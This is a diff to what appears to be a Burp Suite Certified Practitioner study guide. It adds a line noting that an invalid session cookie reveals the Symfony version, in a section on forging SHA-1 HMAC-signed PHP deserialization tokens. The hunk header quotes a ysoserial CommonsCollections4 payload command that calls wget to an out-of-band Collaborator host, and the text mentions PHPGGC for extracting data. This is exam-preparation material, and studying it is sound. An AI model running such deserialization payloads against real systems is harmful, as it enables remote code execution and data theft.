@@ -3001,7 +3001,7 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
   
 ### SHA1 HMAC Symfony
 
->***Identify*** that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash. On the home page we discover a developer comment to debug info for ```/cgi-bin/phpinfo.php```, revealing the digital signature to sign new token.   
+>***Identify*** that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash. On the home page we discover a developer comment to debug info for ```/cgi-bin/phpinfo.php```, revealing the digital signature to sign new token. Sending invalid cookie session value the error reveals, `Symfony Version: 4.3.6`.  
 
 >**Note:** In BSCP exam not going to run this as it delete the file, but in exam read `source code` to ***identify*** the ```unserialize()``` PHP function and extract content out-of-band using ```PHPGGC```.  
 
